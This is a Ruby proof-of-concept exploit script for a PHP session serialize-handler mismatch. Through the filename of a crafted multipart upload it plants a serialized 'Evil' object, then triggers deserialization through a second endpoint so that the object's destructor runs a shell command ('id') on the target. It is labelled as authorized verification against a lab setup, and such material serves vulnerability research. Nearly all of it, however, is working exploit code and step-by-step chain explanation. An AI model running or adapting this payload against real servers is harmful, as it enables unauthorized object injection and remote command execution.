#!/usr/bin/env ruby
# frozen_string_literal: true
#
# CVE-2026-109618/109619 — Verify session handler mismatch → object injection.
#
# Demonstrates:
#   1. Session written in php_serialize format with Evil gadget in filename field
#   2. Pipe | in filename preserved verbatim in the session file
#   3. php handler scans raw bytes, finds |, deserializes Evil object
#   4. Trailing bytes trigger decode FAILURE → PHP_VAR_UNSERIALIZE_DESTROY
#   5. Evil::__destruct fires even though the decode returned FAILURE
#
# Prerequisites:
#   - /app/  directory: session.serialize_handler = php_serialize (.user.ini)
#   - /api/  directory: session.serialize_handler = php           (.user.ini)
#   - Evil class available at rfc1867 time (OPcache preload via php.ini)
#   - Both share the same session.save_path
#
# Usage:
#   ruby verify_handler_mismatch.rb --target http://127.0.0.1:18080
#
# For authorized security testing only.

require 'socket'
require 'optparse'
require 'uri'

def upload(host, port, path, sid, filename)
  boundary = 'MISMATCH'
  body = [
    "--#{boundary}\r\n",
    "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n#{sid}\r\n",
    "--#{boundary}\r\n",
    "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n",
    "--#{boundary}\r\n",
    "Content-Disposition: form-data; name=\"f\"; filename=\"#{filename}\"\r\n\r\nZ\r\n",
    "--#{boundary}--\r\n",
  ].join.b

  request = [
    "POST #{path} HTTP/1.1",
    "Host: #{host}",
    "Content-Type: multipart/form-data; boundary=#{boundary}",
    "Content-Length: #{body.bytesize}",
    "Connection: close",
    "\r\n",
  ].join("\r\n").b + body

  TCPSocket.open(host, port) do |s|
    s.write(request)
    s.read
  end
rescue => e
  warn "  [!] upload failed: #{e}"
  ''
end

opts = {
  target:     'http://127.0.0.1:18080',
  write_path: '/app/roster.php',
  read_path:  '/admin/index.php',
  sid:        'mismatchverify0000000000000',
}

OptionParser.new do |o|
  o.banner = 'Usage: verify_handler_mismatch.rb [options]'
  o.on('--target URL',       'Target base URL')                  { |v| opts[:target]     = v }
  o.on('--write-path PATH',  'Endpoint with php_serialize')      { |v| opts[:write_path] = v }
  o.on('--read-path PATH',   'Endpoint with php handler')        { |v| opts[:read_path]  = v }
  o.on('--sid SID',          'Session ID to use')                { |v| opts[:sid]        = v }
end.parse!

u    = URI.parse(opts[:target])
host = u.host
port = u.port || 80

puts '[*] CVE-2026-109618/109619 — Handler Mismatch Verification'
puts "[*] Target: #{opts[:target]}"
puts

# ── Step 1: Write session via php_serialize endpoint ─────────────────────────
# The filename payload is: x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}
#   - x is arbitrary text before the pipe
#   - | is the separator the php handler will scan for
#   - O:4:"Evil":1:{...} is a valid PHP serialized object
#
# Content-Disposition escaping: \" → " after multipart parsing.
# php_serialize handler stores the actual unescaped string in the session file.
#
# On disk the session looks like:
#   a:1:{s:N:"PHP_SESSION_UPLOAD_PROGRESS_...";a:5:{...s:8:"filename";s:M:"x|O:4:"Evil":...";...}}
#
# The first | in those raw bytes is in our filename value.
gadget = 'x|O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}'

puts "[1] Writing session via #{opts[:write_path]} (php_serialize handler)"
puts "    Filename (Content-Disposition escaped): #{gadget}"
upload(host, port, opts[:write_path], opts[:sid], gadget)
puts '    → Session file written in php_serialize format with Evil gadget'

# ── Step 2: Trigger mismatch via php handler endpoint ────────────────────────
# rfc1867 opens the session (MULTIPART_EVENT_START) with php handler.
# php handler does a byte-level scan for '|':
#   key = everything before first '|'   (the serialized array prefix + "x")
#   val = everything after  first '|'   (O:4:"Evil":1:{s:3:"cmd";s:2:"id";}...)
#
# val starts with a valid O: token → Evil object is created + added to var_hash.
# Trailing bytes (";s:5:"bytes"...}) are not valid as a standalone value.
# The while-loop hits an unexpected token → goto break_outer_loop → FAILURE.
# PHP_VAR_UNSERIALIZE_DESTROY(var_hash) fires → Evil::__destruct runs.
# Evil::__destruct calls shell_exec($this->cmd) → writes /tmp/destruct_triggered.txt
puts "\n[2] Triggering mismatch via #{opts[:read_path]} (php handler)"
puts "    php handler: first | → split → deserialize Evil::{cmd:\"id\"}"
resp = upload(host, port, opts[:read_path], opts[:sid], 'dummy')
           .force_encoding('binary')

status    = resp.split("\r\n", 2).first || 'NO RESPONSE'
body_text = resp.split("\r\n\r\n", 2)[1] || ''
puts "    HTTP: #{status}"

puts
puts '[*] Verification indicators:'
puts '    - PHP warning "Failed to decode session object" → mismatch triggered'
puts '    - /tmp/destruct_triggered.txt written           → Evil::__destruct fired'
puts '    - PHP error_log entry "[Chain-C] Evil::__destruct fired: ..."'
puts
puts '[*] Check on target:'
puts "    cat /tmp/sessions/sess_#{opts[:sid]}   # session file with gadget"
puts '    cat /tmp/destruct_triggered.txt          # created by Evil::__destruct'

if body_text.match?(/Failed to decode|destruction failed/i)
  puts
  puts '    [+] Mismatch confirmed in response warnings'
end
